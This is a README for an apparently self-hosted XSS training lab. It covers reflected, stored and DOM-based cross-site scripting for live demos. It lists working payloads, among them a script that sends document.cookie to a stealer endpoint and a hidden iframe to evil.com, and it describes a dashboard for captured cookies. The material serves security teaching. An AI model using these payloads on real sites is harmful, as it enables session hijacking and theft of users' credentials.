# 🚀 aarsaputra | Advanced XSS Pentest Lab

Welcome to the **Advanced XSS Pentest Lab**, a professionalized web environment designed specifically for live demonstrations and security research into Cross-Site Scripting (XSS) vulnerabilities. 

This lab features a modern **Cyberpunk & Glassmorphism UI** and covers the three main types of XSS: **Reflected**, **Stored**, and **DOM-based**.

---

## 🛠️ Features
- **Modern UI**: Full dark-mode Cyberpunk aesthetic.
- **Presenter Mode**: Built-in toggle to reveal vulnerability explanations and recommended payloads during live demos.
- **Live Exfiltration Dashboard**: Real-time monitoring of "stolen" cookies and session tokens.
- **Consolidated Lab**: All-in-one platform for rapid XSS testing.

---

## ⚙️ Installation & Running (Linux)

### Prerequisites
- PHP 8.x or higher
- Linux (Ubuntu/Kali/Debian recommended)

### Step 1: Clone or Copy the Repository
```bash
git clone https://github.com/your-username/xss-pentest-lab.git
cd xss-pentest-lab
```

### Step 2: Set Proper Permissions
Ensure the PHP process can write to the JSON database files:
```bash
chmod 777 database_komen.json captured.json
```

### Step 3: Start the Local Server
Run the built-in PHP server:
```bash
php -S localhost:8000
```
Then, open your browser and navigate to: `http://localhost:8000`

---

## 🧪 XSS Testing Guide & Payloads

Each lab in this repository is designed to demonstrate a specific attack vector. Below are the recommended payloads for your presentation:

### 1. Reflected XSS (Search Lab)
*Triggered when the application reflects user input back to the page without sanitization.*
- **Basic Alert**: `<script>alert('Reflected XSS')</script>`
- **Styling Injection**: `<b onmouseover="alert('Reflected')">Hover over me!</b>`
- **Exfiltration**: `<script>document.location='stealer.php?c='+document.cookie</script>`

### 2. Stored XSS (Forum & Profile)
*Triggered when the payload is saved permanently in the database and executed for every visiting user.*
- **Stealth Injection**: `<img src=x onerror="alert(document.cookie)">`
- **Auto-execution**: `<svg onload="alert('Stored XSS')">`
- **Iframe Overlay**: `<iframe src="https://evil.com" style="display:none"></iframe>`

### 3. DOM-based XSS (Hash Lab)
*Triggered entirely on the client-side via JavaScript manipulation of the DOM.*
- **Hash Injection**: `index.php?page=dom#<img src=x onerror=alert('DOM_XSS')>`
- **Modern JS Injection**: `index.php?page=dom#<details open ontoggle=alert('DOM_XSS')>`

---

## 🕵️ Monitoring Captures
To view the results of your cookie exfiltration attacks, visit the **Capture Dashboard**:
`http://localhost:8000/captured.php`

> [!IMPORTANT]
> This lab is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**. Do not use it on systems you do not own or have explicit permission to test.

---

## 👤 Author
- **aarsaputra** - *Initial Work & Design*

## 🛡️ Phase 2: Security Levels
The lab now features selectable Security Levels (LOW, MEDIUM, HIGH) to simulate Web Application Firewalls (WAF) and proper output sanitization.
- **Low**: No filters. 100% vulnerable.
- **Medium**: Blocks common tags like `<script>`. Requires bypass techniques.
- **High**: Strict HTML entity encoding. Completely secure.

*Refer to  for specific bypass payloads.*
